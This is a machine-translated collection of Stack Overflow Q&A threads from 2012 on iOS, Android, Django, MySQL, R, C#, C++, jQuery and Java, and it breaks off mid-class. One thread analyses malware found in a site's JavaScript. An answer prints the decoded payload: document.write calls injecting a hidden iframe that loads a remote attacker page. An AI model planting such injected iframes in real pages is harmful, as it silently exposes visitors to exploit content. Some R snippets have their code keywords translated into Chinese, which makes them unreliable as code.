> 
> 时间：2012-08-05T22:15:56.883
> 
> 标签：ios, core-image

我正在使用 Core Image 过滤器并尝试制作 CIEdgeWork 过滤器。应用滤镜后，图像变黑。我是否正确初始化 CIFilter。

```
 CIFilter *edgeWork = [CIFilter filterWithName:@"CIEdgeWork"
                                       keysAndValues:kCIInputImageKey,filterPreviewImage,
                             @"inputRadius",[NSNumber numberWithFloat:3.0],
                             nil]; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-05T22:41:43.077

从 iOS 5.x 开始， CIEdgeWork[在 iOS 上的 Core Image 中不可用](https://stackoverflow.com/questions/8528726/does-ios-5-support-blur-coreimage-fiters)，因此在尝试使用它时看到黑色图像也就不足为奇了。

但是，您可以使用我的[GPUImage](https://github.com/BradLarson/GPUImage)框架中的 GPUImageSketchFilter 或 GPUImageThresholdEdgeDetection 来实现相同的效果。[您可以在此答案](https://stackoverflow.com/questions/5830139/where-can-i-find-sample-opengl-es-2-0-shaders-that-perform-image-processing-task/9402041#9402041)中看到第一个过滤器的结果。后一种过滤器可能更接近 Apple 通过 CIEdgeWork 提供的实际效果，因为它们似乎对生成的边缘检测图像进行了二值化。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-08-04T20:24:39.863

现在 CIEdgeWork 和 CILineOverlay 可用于 iOS9

[CIEdgeWork](https://developer.apple.com/library/ios/documentation/GraphicsImaging/Reference/CoreImageFilterReference/index.html#//apple_ref/doc/filter/ci/CIEdgeWork)

您还可以使用基于 GPUImageSketchFilter 的 CoreImage 过滤器 Sobel Sketch。 [FWKSketchFilter](https://gist.github.com/vgoltv/6d1f612573b48a74a434395f67af3ebf)

它的内核：

```
kernel vec4 sketch(sampler image, float strength){
vec2 d = destCoord();

vec2 bottomLeftTextureCoordinate = samplerTransform(image, d + vec2(-1.0, -1.0));
vec2 topRightTextureCoordinate = samplerTransform(image, d + vec2(1.0, 1.0));
vec2 topLeftTextureCoordinate = samplerTransform(image, d + vec2(-1.0, 1.0));
vec2 bottomRightTextureCoordinate = samplerTransform(image, d + vec2(1.0, -1.0));

vec2 leftTextureCoordinate = samplerTransform(image, d + vec2(-1.0, 0.0));
vec2 rightTextureCoordinate = samplerTransform(image, d + vec2(1.0, 0.0));
vec2 bottomTextureCoordinate = samplerTransform(image, d + vec2(0.0, -1.0));
vec2 topTextureCoordinate = samplerTransform(image, d + vec2(0.0, 1.0));

float bottomLeftIntensity = sample(image, bottomLeftTextureCoordinate).r;
float topRightIntensity = sample(image, topRightTextureCoordinate).r;
float topLeftIntensity = sample(image, topLeftTextureCoordinate).r;
float bottomRightIntensity = sample(image, bottomRightTextureCoordinate).r;

float leftIntensity = sample(image, leftTextureCoordinate).r;
float rightIntensity = sample(image, rightTextureCoordinate).r;
float bottomIntensity = sample(image, bottomTextureCoordinate).r;
float topIntensity = sample(image, topTextureCoordinate).r;

float h = -topLeftIntensity - 2.0 * topIntensity - topRightIntensity + bottomLeftIntensity + 2.0 * bottomIntensity + bottomRightIntensity;
float v = -bottomLeftIntensity - 2.0 * leftIntensity - topLeftIntensity + bottomRightIntensity + 2.0 * rightIntensity + topRightIntensity;

float mag = 1.0 - (length(vec2(h, v))*strength);

return vec4(vec3(mag), 1.0);} 
```

# android - 将 TextView 格式化为看起来像链接

> ID：11820526
> 
> 赞同：16
> 
> 时间：2012-08-05T22:16:46.603
> 
> 标签：android

我一直在使用`android:autoLink`刚刚好的格式链接等，但我需要使用`android:onClick`，所以在这种情况下我不能使用它。原因是我发现不小心点击电话号码太容易了，所以我打算拦截点击并确认`Dialog`然后拨打电话。

有没有一种简单的方法可以让我的电话号码`TextView`看起来像一个普通的可点击链接？我浏览了 Android 源代码，但找不到任何特定的样式供我参考。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2014-09-07T07:06:23.583

这是最短的解决方案：

```
final CharSequence text = tv.getText();
final SpannableString spannableString = new SpannableString( text );
spannableString.setSpan(new URLSpan(""), 0, spannableString.length(), Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
tv.setText(spannableString, TextView.BufferType.SPANNABLE); 
```

可悲的是，点击的效果不会显示为点击真正的 url 链接，但您可以像这样克服它：

```
 final CharSequence text = tv.getText();
    final SpannableString notClickedString = new SpannableString(text);
    notClickedString.setSpan(new URLSpan(""), 0, notClickedString.length(), Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
    tv.setText(notClickedString, TextView.BufferType.SPANNABLE);
    final SpannableString clickedString = new SpannableString(notClickedString);
    clickedString.setSpan(new BackgroundColorSpan(Color.GRAY), 0, notClickedString.length(),
            Spanned.SPAN_INCLUSIVE_EXCLUSIVE);
    tv.setOnTouchListener(new OnTouchListener() {
        @Override
        public boolean onTouch(final View v, final MotionEvent event) {
            switch (event.getAction()) {
            case MotionEvent.ACTION_DOWN:
                tv.setText(clickedString);
                break;
            case MotionEvent.ACTION_UP:
                tv.setText(notClickedString, TextView.BufferType.SPANNABLE);
                v.performClick();
                break;
            case MotionEvent.ACTION_CANCEL:
                tv.setText(notClickedString, TextView.BufferType.SPANNABLE);
                break;
            }
            return true;
        }
    }); 
```

另一种解决方案是使用 Html.fromHtml(...) ，其中的文本有链接标签 ("") 。

如果您希望获得其他解决方案，请查看[**此帖子**](https://stackoverflow.com/questions/19623872/how-to-show-links-on-textviews-and-be-able-to-handle-them-correctly)。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-06T01:55:24.947

Linkify 是一个很棒的类，它寻找复杂的模式，如 URL、电话号码等，并将它们转换为 URLSpans。我没有重写现有的正则表达式，而是扩展了 URLSpan 类并创建了一个方法，*仅*将电话 URLSpan 升级为带有确认对话框的自定义 URLSpan。

**首先**是我的扩展 URLSpan 类 ConfirmSpan：

```
class ConfirmSpan extends URLSpan {
    AlertDialog dialog;
    View mView;

    public ConfirmSpan(URLSpan span) {
        super(span.getURL());
    }

    @Override
    public void onClick(View widget) {
        mView = widget;

        if(dialog == null) {
            AlertDialog.Builder mBuilder = new AlertDialog.Builder(widget.getContext());
            mBuilder.setMessage("Do you want to call: " + getURL().substring(4) + "?");
            mBuilder.setNegativeButton("No", new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int id) {
                    dialog.cancel();
                }
            })
            .setPositiveButton("Yes", new DialogInterface.OnClickListener() {
                public void onClick(DialogInterface dialog, int id) {
                    openURL();
                }
            });
            dialog = mBuilder.create();
        }
        dialog.show();
    }

    public void openURL() {
        super.onClick(mView);
    }
} 
```

**接下来**是换出不同跨度类的方法：

```
private void swapSpans(TextView textView) {
    Spannable spannable = (Spannable) textView.getText();
    URLSpan[] spans = textView.getUrls();
    for(URLSpan span : spans) {
        if(span.getURL().toString().startsWith("tel:")) {
            spannable.setSpan(new ConfirmSpan(span), spannable.getSpanStart(span), spannable.getSpanEnd(span), Spannable.SPAN_EXCLUSIVE_EXCLUSIVE);
            spannable.removeSpan(span);
        }
    }
} 
```

**最后**，您需要做的就是创建一个带有 autoLink 属性的 TextView：

```
android:autoLink="phone" 
```

并记得调用该`swapSpans()`方法。明白我写这个是为了好玩，可能还有其他方法可以做到这一点，但我目前不知道它们。希望这可以帮助！

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-05T23:30:58.790

要为 TextView 的文本添加下划线，您必须执行以下操作：

```
final TextView text = (TextView) findViewById(R.id.text);

SpannableString string = new SpannableString("This is the uderlined text.");
string.setSpan(new UnderlineSpan(), 0, string.length(), 0);
text.setText(string); 
```

这应该有效。让我知道你的进展。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-08-05T22:31:08.303

*   您可以创建一个 colors.xml 资源文件，其中包含颜色。请看[颜色](https://stackoverflow.com/questions/3769762/android-color-xml-resource-file)
*   如果你想给你的文字加下划线，那么请看这篇文章： [下划线](https://stackoverflow.com/questions/2394935/can-i-underline-text-in-an-android-layout)
*   不要忘记添加`android:clickable="true"`或添加`setClickable(true)`到您的 TextViews 以使它们可点击！

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2019-04-02T22:43:19.950

带有 kotlin 扩展功能（如果您不需要真实链接上的点击效果）

```
fun TextView.hyperlinkStyle() {
    setText(
        SpannableString(text).apply {
            setSpan(
                URLSpan(""),
                0,
                length,
                Spanned.SPAN_EXCLUSIVE_EXCLUSIVE
            )
        },
        TextView.BufferType.SPANNABLE
    )
} 
```

如何使用

```
yourTextView.hyperlinkStyle() 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2017-06-10T10:15:38.627

有一个更好的答案。这就是我所做的。

```
 final SpannableString ss = new SpannableString("Click here to verify Benificiary");
        ClickableSpan clickableSpan = new ClickableSpan() {
            @Override
            public void onClick(View textView) {

            }
            @Override
            public void updateDrawState(TextPaint ds) {
                super.updateDrawState(ds);
                ds.setUnderlineText(false);
            }
        };
        ss.setSpan(clickableSpan,0,ss.length(),Spanned.SPAN_EXCLUSIVE_EXCLUSIVE);
textView.setMovementMethod(LinkMovementMethod.getInstance());
        textView.setHighlightColor(Color.BLUE); 
```

* * *

当用户通过 ClickableSpan 的 onclick 方法单击链接时，您可以去任何您喜欢的地方

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2020-01-29T15:58:03.860

简单地强调它：

```
val myText = "Text to be underlined"
textView.text = Html.fromHtml("<u>$myText</u>") 
```

或使用 kotlin 扩展：

```
fun TextView.underline() {
    text = Html.fromHtml("<u>${text}</u>")
} 
```

用法：

```
textView.text = myText
textView.underline() 
```

更多在 android 中设置文本样式的方法：[https ://medium.com/androiddevelopers/spantastic-text-styling-with-spans-17b0c16b4568](https://medium.com/androiddevelopers/spantastic-text-styling-with-spans-17b0c16b4568)

# python - 如何从 Django 缓存中分配和返回多个值？

> ID：11820527
> 
> 赞同：1
> 
> 时间：2012-08-05T22:16:46.137
> 
> 标签：python, django, function, caching

不确定这是 django 问题还是 python 问题。我试图通过从返回多个值的函数中接受值来使缓存工作。

目前页面在heavy_view函数上给了我这个错误：“'NoneType'对象不可迭代”

有没有办法让“counter，college_user，name_college_list = cache.get(cache_key)”行工作？然后检查它是否为空。谢谢！

```
 #Views.py

 def filter_results():
     #some code here

     return counter, college_user, name_college_List    

 def heavy_view(request):
     cache_key = 'facebookcache'
     cache_time = 180 # time to live in seconds
     counter, college_user, name_college_list = cache.get(cache_key)
     if not cache.get(cache_key):
         result = filter_results() # some calculations here
         cache.set(cache_key, result, cache_time)
     return result 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-05T22:36:45.643

这是一个 Python 的东西

当你这样做时

```
counter, college_user, name_college_list = cache.get(cache_key) 
```

第一次没有值存在 ->`None`被返回。这行得通吗？

```
result = cache.get(cache_key)
if result is None:
    result = filter_results()
    cache.set(cache_key, result, cache_time)
else:
    counter, college_user, name_college_list = result
return result 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-05T22:38:53.417

你可以这样做：

```
result = cache.get(cache_key)
if not result:
    result = filter_result()
    cache.set(cache_key, result, cache_time)

counter, college_user, name_college_list = result 
```

# mysql - 比较两个表中的多个字段时，一个表更新缓慢

> ID：11820530
> 
> 赞同：0
> 
> 时间：2012-08-05T22:17:15.953
> 
> 标签：mysql

以下查询在 600 秒后超时。

```
update placed p
      ,Results r
  set p.position = r.position
  where p.competitor = r.competitor
    AND p.date = r.date 
    AND REPLACE(p.time,":","") = r.time; 
```

结构如下：

```
'CREATE TABLE `placed` (
  `idplaced` varchar(50) DEFAULT NULL,
  `date` decimal(8,0) DEFAULT NULL,
  `time` varchar(45) DEFAULT NULL,
  `field1` varchar(45) DEFAULT NULL,
  `competitor` varchar(45) DEFAULT NULL,
  `field2` int(2) DEFAULT NULL,
  `field3` varchar(45) DEFAULT NULL,
  `field4` varchar(45) DEFAULT NULL,
  `field5` decimal(6,2) DEFAULT NULL,
  `field6` decimal(10,2) DEFAULT NULL,
  `field7` decimal(6,2) DEFAULT NULL,
  `field8` char(1) DEFAULT NULL,
  `field9` varchar(45) DEFAULT NULL,
  `position` char(4) DEFAULT NULL,
  `field10` decimal(6,2) DEFAULT NULL,
  `field11` char(1) DEFAULT NULL,
  `field12` char(1) DEFAULT NULL,
  `field13` decimal(6,2) DEFAULT NULL,
  `field14` decimal(6,2) DEFAULT NULL,
  `field15` decimal(6,2) DEFAULT NULL,
  `field16` decimal(6,2) DEFAULT NULL,
  `field17` decimal(6,2) DEFAULT NULL,
  `field18` char(1) DEFAULT NULL,
  `field19` char(20) DEFAULT NULL,
  `field20` char(1) DEFAULT NULL,
  `field21` char(5) DEFAULT NULL,
  `field22` char(5) DEFAULT NULL,
  `field23` int(11) DEFAULT NULL
   PRIMARY KEY (`idplaced`),
  UNIQUE KEY `date_time_competitor_field18_combo` (`date`,`time`,`competitor`,`field18`)
) ENGINE=InnoDB AUTO_INCREMENT=100688607 DEFAULT CHARSET=latin1;

CREATE TABLE `results` (
  `idresults` int(11) NOT NULL AUTO_INCREMENT,
  `date` char(8) DEFAULT NULL,
  `time` char(4) DEFAULT NULL,
  `field1` varchar(45) DEFAULT NULL,
  `competitor` varchar(45) DEFAULT NULL,
  `position` char(4) DEFAULT NULL,
  `field2` varchar(45) DEFAULT NULL,
  `field3` decimal(2,0) DEFAULT NULL,
  PRIMARY KEY (`idresults`)
) ENGINE=InnoDB AUTO_INCREMENT=6644 DEFAULT CHARSET=latin1; 
```

该`PLACED`表有 65,000 条记录，该`RESULTS`表有 9,000 条记录。

我假设解决方案涉及`JOIN`一些描述性的陈述，并且我尝试从该站点获取一些建议，但根本找不到我正在寻找的答案。简而言之，我将不胜感激有关此的建议。如果需要，我可以提供示例表/创建表代码。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-06T06:48:09.120

首先，您最好将您的完整表格描述发送给我们，使用

```
show create table 
```

其次，您最好使用连接语法：

```
update placed p
  join Results r on r.competitor = p.competitor
   set p.position = r.position
 where p.date = r.date 
   AND REPLACE(p.time,":","") = r.time; 
```

希望这会有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-06T08:22:18.410

`REPLACE`由于您的操作，无法有效地使用索引来执行连接。我建议使用以下稍微不同的顺序创建一个索引：

```
(date, competitor, time, position) 
```

在两个表上添加此索引也可能会有所帮助。

`time`如果您可以修改数据库中的数据，使列中的数据以相同的格式存储在两个表中，那就更好了。

# r - 为无监督学习生成合成数据

> ID：11820532
> 
> 赞同：1
> 
> 时间：2012-08-05T22:17:51.807
> 
> 标签：r, dataset, cluster-analysis, random-forest, unsupervised-learning

我想为随机森林的无监督学习准备数据。程序如下：

*   获取数据并将值为 1 的属性“类”添加到所有示例
*   从原始数据生成合成数据：
    *   虽然您没有与原始数据构建示例相同数量的示例：
        *   从原始数据中该属性的所有值中采样新的属性值
        *   对所有属性执行此操作并将它们组合到新示例中
*   分配给合成数据值 2 的属性“类”
*   将两个数据绑定在一起

最后它看起来像这样：

```
 ...      Class
                |1
     Original   |1
     Data       |1
                |1
    --------------
                |2
     Synthetic  |2
     Data       |2
                |2 
```

我的 R 代码如下所示：

```
library(gtools) #for smartbind()

sample1 <- function(X)   { sample(X, replace=T) } 
g1      <- function(dat) { apply(dat,2,sample1) }

data$class <- rep(1, times=nrow(data)) #add attribute 'class' with value 1

synthData<-data.frame(g1(data[,1:ncol(data)])) #generate synthetic data with sampling from data
synthData$class <- rep(2, times=nrow(synthData)) #attribute 'class' is 2
colnames(synthData) <- colnames(data)
newData <- smartbind(data, synthData) #bind the data together 
```

很明显，我对 R 真的很陌生，但它确实有效——只有一个问题：合成数据中的属性类型与原始数据中的不同。如果原来它们是 nums，那么现在它们变成了因数。如何在生成合成数据时保留相同的类型？

谢谢！

Data1（数字成为因素）：

> 结构(列表(V2 = c(1.51793, 1.51711, 1.51645, 1.51916, 1.51131), V3 = c(13.21, 12.89, 13.44, 14.15, 13.69), V4 = c(3.48, 3.62, 3.61, 0, 3.2), V5 = c(1.41, 1.57, 1.54, 2.09, 1.81), V6 = c(72.64, 72.96, 72.39, 72.74, 72.81), V7 = c(0.59, 0.61, 0.66, 0, 1.76), V8 = c(8.43, 8.11, 8.03, 10.88, 5.43), V9 = c(0, 0, 0, 0, 1.19), V10 = c(0, 0, 0, 0, 0), realClass = structure(c(1L, 2L, 2L) , 5L, 6L), .Label = c("1", "2", "3", "5", "6", "7"), class = "factor")), .Names = c(" V2”、“V3”、“V4”、“V5”、“V6”、“V7”、“V8”、“V9”、“V10”、“realClass”），row.names = c(27L, 138L, 77L, 183L, 186L), 类 = "data.frame")

Data2（因子变为 chrs）：

> 结构（列表（realClass =结构（c（2L，2L，2L，1L，2L），.Label = c（“e”，“p”），类=“因子”），V2 =结构（c（6L， 3L, 4L, 6L, 6L), .Label = c("b", "c", "f", "k", "s", "x"), class = "factor"), V3 = structure( c(4L, 4L, 3L, 1L, 1L), .Label = c("f", "g", "s", "y"), class = "factor"), V4 = structure(c(5L, 5L, 5L, 3L, 4L), .Label = c("b", "c", "e", "g", "n", "p", "r", "u", "w", "y"), class = "factor"), V5 = structure(c(1L, 1L, 1L, 2L, 1L), .Label = c("f", "t"), class = "factor"), V6 = 结构(c(3L, 9L, 3L, 6L, 3L), .标签 = c("a", "c", "f", "l", "m", "n", "p", "s", "y"), class = "factor"), V7 =结构(c(2L, 2L, 2L, 2L, 2L), .Label = c("a", "f"), class = "factor"), V8 = structure(c(1L, 1L, 1L, 1L, 1L), .Label = c("c", "w"), class = "factor"), V9 = structure(c(2L, 2L, 2L, 1L, 1L), .Label = c("b", "n"), class = "factor"), V10 = structure(c(1L, 1L, 1L, 10L, 4L), .Label = c("b", "e", "g", "h", “k”，“n”，“o”，“p”，“r”，“u”，“w”，“y”），类 =“因子”），V11 = 结构（c（2L，2L， 2L, 2L, 1L), .标签 = c("e", "t"), class = "factor"), V12 = structure(c(NA, NA, NA, 1L, 1L), .Label = c("b", "c", "e", "r"), class = "factor"), V13 = structure(c(3L, 2L, 3L, 3L, 2L), .Label = c("f", "k", "s", "y"), class = "factor"), V14 = structure(c(3L, 3L, 2L, 3L, 2L), .Label = c("f", "k", "s", "y") , class = "factor"), V15 = structure(c(7L, 8L, 7L, 4L, 7L), .Label = c("b", "c", "e", "g", "n", “o”、“p”、“w”、“y”）、类 =“因子”）、V16 = 结构（c（7L、7L、8L、4L、1L），.Label = c（“b”， “c”、“e”、“g”、“n”、“o”、“p”、“w”、“y”），类 = “因子”），V17 = 结构（c（1L，1L，1L，1L，1L），.标签 = “p”，类 = “因子”），V18 = 结构（c（3L，3L，3L，3L，3L），.Label = c（“n”，“o”，“w”，“y” ), 类 = "因子"), V19 = 结构 (c(2L, 2L, 2L, 2L, 2L), .Label = c("n", "o", "t"), 类 = "因子") , V20 = 结构(c(1L, 1L, 1L, 5L, 3L), .Label = c("e", "f", "l", "n", "p"), class = "factor") , V21 = 结构(c(8L, 8L, 8L, 4L, 2L), .Label = c("b", "h", "k", "n", "o", "r", "u" , "w","y"), class = "factor"), V22 = structure(c(5L, 5L, 5L, 5L, 6L), .Label = c("a", "c", "n", "s", "v", "y"), class = "factor"), V23 = structure(c(3L, 3L, 5L, 1L, 2L), .Label = c("d", "g", "l", “m”、“p”、“u”、“w”）、class =“因子”））、.Names = c（“realClass”、“V2”、“V3”、“V4”、“V5”、 “V6”、“V7”、“V8”、“V9”、“V10”、“V11”、“V12”、“V13”、“V14”、“V15”、“V16”、“V17”、“V18” ", "V19", "V20", "V21", "V22", "V23"), row.names = c(4105L, 6207L,6696L, 2736L, 3756L), 类 = "data.frame")

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-05T22:55:35.937

你总是可以使用这个技巧来拥有数字列

```
numcol <- as.numeric(as.character(factcol)) 
```

但我怀疑你的 data.frame 中有因子变量。由于`apply`返回一个矩阵，如果您的数据中有一个因子，则所有数值变量也将被强制为因子。

这是一个示例，使用玩具数据集

```
set.seed(123)
toydat <- data.frame(A = 1:10, B = rnorm(10), C = LETTERS[1:10])
str(toydat)

## 'data.frame':    10 obs. of  3 variables:
##  $ A: int  1 2 3 4 5 6 7 8 9 10
##  $ B: num  -0.5605 -0.2302 1.5587 0.0705 0.1293 ...
##  $ C: Factor w/ 10 levels "A","B","C","D",..: 1 2 3 4 5 6 7 8 9 10

set.seed(1)
str(data.frame(apply(toydat[,1:2], 2, sample, replace = TRUE)))

## 'data.frame':    10 obs. of  2 variables:
##  $ A: num  3 4 6 10 3 9 10 7 7 1
##  $ B: num  1.5587 -0.2302 0.4609 0.0705 -1.2651 ...

# with the factor column C     
set.seed(2)
str(data.frame(apply(toydat[,1:3], 2, sample, replace = TRUE)))

## 'data.frame':    10 obs. of  3 variables:
##  $ A: Factor w/ 6 levels "10"," 2"," 5",..: 2 5 4 2 1 1 2 6 3 4
##  $ B: Factor w/ 8 levels " 0.129288","-0.230177",..: 8 7 6 2 1 5 3 7 1 4
##  $ C: Factor w/ 6 levels "B","D","E","G",..: 4 2 5 1 2 3 1 2 6 1 
```

这是`plyr`包变得有用的地方，因为您可以控制输出（使用 **ply）。但是在这种情况下，`colwise`功能就足够了

```
require(plyr)
set.seed(2)
mysamplingfun <- colwise(function(x) sample(x, replace = TRUE))
str(mysamplingfun(toydat[,1:3]))

## 'data.frame':    10 obs. of  3 variables:
##  $ A: int  2 8 6 2 10 10 2 9 5 6
##  $ B: num  1.715 1.559 -1.265 -0.23 0.129 ...
##  $ C: Factor w/ 10 levels "A","B","C","D",..: 7 4 9 2 4 5 2 4 10 2 
```

# c# - 对组合框使用 IF 语句

> ID：11820538
> 
> 赞同：-1
> 
> 时间：2012-08-05T22:18:49.080
> 
> 标签：c#, if-statement, combobox

假设我在组合框中填充了项目（项目是这个特定示例的一些数字），并且我想告诉 C# 类似这样的内容：在组合框中选择了`IF`一些`item`，得到它`item`并将其乘以`2`. 有什么办法可以做到这一点吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-05T22:32:50.647

假设它由整数列表填充。例如

```
for(int index = 0; index < 10; index++)
{
  myCombobox.Add(index);
}

if (myCombobox.SelectedItem != null)
{
  int value = ((int)myCombobox.SelectedItem) * 2;
} 
```

当然是Winforms

如果它们是字符串，那将是类似的东西

```
if (myCombobox.SelectedItem != null)
{
  int value = int.Parse(myCombobox.SelectedItem.ToString()) * 2;
} 
```

# iphone - 在方法持续期间显示 MBProgressHUD

> ID：11820539
> 
> 赞同：0
> 
> 时间：2012-08-05T22:19:04.293
> 
> 标签：iphone, objective-c, uiactivityindicatorview, mbprogresshud

我有一种方法可以从通讯录中获取联系人并用他们做一些事情**（“getContactInformation”）**。

这个过程有点长（**几秒钟**），在这个过程之后我展示了一个新的`ViewController`. 为了使其对用户友好，我想使用**MBProgressHUD**在流程开始时显示活动指示器并在结束时隐藏它。

**最好的方法是什么？**我已经对此进行了测试：

```
MBProgressHUD *hud = [MBProgressHUD showHUDAddedTo:self.view animated:YES];
hud.labelText = @"Retrieving information...";

[self getContactInformation];

[MBProgressHUD hideHUDForView:self.view animated:YES];

[self presentViewController:newController animated:NO completion:nil]; 
```

但**它不起作用**（它不显示指标）。任何人都可以帮助我吗？

先感谢您

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-06T08:00:20.317

为`[self presentViewController:newController animated:NO completion:nil];`. 并尝试在某些特定延迟后调用该方法。那应该可以解决问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-21T15:32:56.697

```
dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_LOW, 0), ^{
    [self getContactInformation];
    dispatch_async(dispatch_get_main_queue(), ^{
        [MBProgressHUD hideHUDForView:self.mapView animated:YES];
    });
}); 
```

这将产生一个线程来运行 getContactInformation 并且不会阻塞执行 UI 更改（例如显示 HUD）所需的主线程。

我猜当您获得联系信息并且没有时间更新以显示 HUD 时，主线程已被锁定。一旦方法完成，它会再次获取主线程来更新 UI（移除 HUD）。

# javascript - 在我的 javascript 文件中发现的这个奇怪的代码是什么？

> ID：11820540
> 
> 赞同：3
> 
> 时间：2012-08-05T22:19:12.817
> 
> 标签：javascript, virus

我的一个表单验证文件，我发现了以下代码（见下文） 我的朋友在扫描我的网站时指出了它，说它是病毒。

但它到底是什么？

[http://pastebin.com/P8KBm0xk](http://pastebin.com/P8KBm0xk)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-05T22:24:18.523

一种病毒。我在数组文字中包含一些带有 Unicode 转义字符的字符串，第一个是一些 html，第二个是`"write"`. 然后，`document[arr[1]](arr[0])`执行，转换为以下内容：

```
document.write('<div name="youtube" style="display:none"><iframe width="560" height="315" src="evil://mazda.georgewkohn.com/direct.php?page=15f48be84d67654d" frameborder="0" allowfullscreen></iframe></div>');
document.write('<div name="youtube" style="display:none"><iframe width="560" height="315" src="evil://mazda.georgewkohn.com/direct.php?page=15f48be84d67654d" frameborder="0" allowfullscreen></iframe></div>'); 
```

我不知道（也不会检查）这些 iframe 包含什么，可能会有一些漏洞利用。

此外，代码确实包含（在这两个 iframe 写入之间）一些函数（`_1lO`和`O0l`），这些函数可能在`IlO`字符串被编辑之前对字符串进行转义`eval`（是的，eval 是邪恶的！:-)，但是你的 pastebin 前面有一些缺失的代码片段，所以我无法告诉你他们到底做了什么。你能给我们完整的剧本吗？

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-05T22:25:11.737

这是一种混淆病毒。所有这些东西的某个地方将是一个 eval()。如果您想知道它到底做了什么，您将不得不解码这些部分并查看。

更有趣的是，这些东西是如何在你的代码中结束的。

# c++ - 错误：从“short unsigned int*”到“short unsigned int”的无效转换| （在 C++ 中）

> ID：11820543
> 
> 赞同：1
> 
> 时间：2012-08-05T22:19:44.813
> 
> 标签：c++

我是编程新手，我一直在尝试创建一个可以解决任何数独难题的程序。但是，我遇到了很多错误，在这个错误中，我无法弄清楚出了什么问题。

这是错误所在的代码：

```
for (short o = indice;o>=divergencias[n_diver];o--){
    N=historico[o];
    P=tabela[N];  //Line 205
    tabela[N]=0;  //Line 206
    }
    indice -= divergencias[n_diver];
    n_diver --;
    } 
```

在标有注释的行上发生的错误是：

```
C:\(...)\main.cpp|205|error: invalid conversion from 'short unsigned int*' to 'short unsigned int'| 
```

和

```
C:\(...)\main.cpp|206|error: incompatible types in assignment of 'int' to 'short unsigned int [9]'| 
```

我一直在寻找这个错误，并没有找到任何令人满意的答案。此外，我学习编程知识的网站指定编写类似的东西`b = billy [a+2];`是有效的。所以我只是不明白这有什么问题......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T22:23:53.550

它看起来像`tabela`被声明为`short unsigned tabela[9][9]`. 为了从中获取类型项目，`unsigned short`您必须提供两个索引，而不是一个。

另一方面，如果您希望从 获取整个子数组`tabela`，则赋值左侧需要与 的一维数组兼容`unsigned short`，例如`unsigned short*`指针。

# javascript - 添加/删除类并使用 Cookie 记住选择

> ID：11820544
> 
> 赞同：0
> 
> 时间：2012-08-05T22:20:00.823
> 
> 标签：javascript, jquery

我有这个简单的 JQuery 片段，可以在锚标签/链接上切换一个类。我不知道的是如何在单击其他链接时使类切换或添加/删除？示例：该类只能应用于单击的链接，并且一次不能超过一个。这就是我卡住的地方。嗯，我不知道该怎么做。

其次，我如何使用 JQuery Cookie 来保持当前链接处于活动状态。我已经下载了 cookie 扩展。

这是我所做的：

HTML：

```
<ul class="navbar">
 <li><a  href="#/">Link1</a></li>
 <li><a href="#/">Link2</a></li>
 <li><a  href="#/">Link3</a></li>
</ul> 
```

CSS：

```
.activeLink{
    color: #930;
} 
```

查询：

```
$(document).ready(function() {
$('.navbar li a').click(function(){
    $(this).toggleClass('activeLink');
}); 
}); 
```

谢谢！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T23:03:16.240

以下是使用事件传播的解决方案：

```
$(function() {

    var $activeLink,
        activeLinkHref = $.cookie('activeLinkHref'),
        activeClass = 'activeLink';

    $('.navbar').on('click', 'a', function() {
        $activeLink && $activeLink.removeClass(activeClass);
        $activeLink = $(this).addClass(activeClass);
        $.cookie('activeLinkHref', $activeLink.attr('href'));
    });

    // If a cookie is found, activate the related link.
    if (activeLinkHref) 
    $('.navbar a[href="' + activeLinkHref + '"]').click();

});​ 
```

这是一个[演示](http://jsfiddle.net/TGeZ2/)（没有 cookie 功能，因为 JSFiddle 缺乏支持）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-05T22:33:50.473

这是我的做法。这有点简单，但它可以在没有太多大脑压力的情况下完成工作。

```
<ul class="navbar">
 <li><a  href="#/">Link1</a></li>
 <li><a href="#/">Link2</a></li>
 <li><a  href="#/">Link3</a></li>
</ul>

<script>
$(document).ready(function() {
$('.navbar li a').click(function(){
    $('.navbar li a').css('color', 'black');
    $(this).css('color', '#930');
}); 
});
</script> 
```

# java - 将数组对象添加到列表

> ID：11820547
> 
> 赞同：1
> 
> 时间：2012-08-05T22:20:41.557
> 
> 标签：java, arrays, list, object

我是 java 新手，将数组对象添加到列表时遇到问题。我已经检查了该论坛中的主题，但找不到与我的问题类似的内容。

我已经创建了一个名为 Item 的类，它将保存有关待售商品的信息，它有 4 个实例变量 id、desc、cost、quantity。然后我有一个销售类，它有我的主要方法。基本上我想要做的是从我的 Item 类构建一个对象数组并对我的数据进行硬编码（我已经创建了，但我不确定我是否做得对）。

我创建了一个 ArrayList，我现在要做的是将我创建的数组中的 5 个对象添加到列表中。

这是我的项目类

```
public class Item {

    private String itemID;
    private String desc;
    private double cost;
    private int quantity;

    public Item() {
        itemID="";
        desc="";
        cost=0;
        quantity=0;
    }

    public Item(String id, String d, double c, int q) {
        itemID = id;
        desc = d;
        cost = c;
        quantity = q;

    }

    /**
     * @return the itemID
     */
    public String getItemID() {
        return itemID;
    }

    /**
     * @param itemID the itemID to set
     */
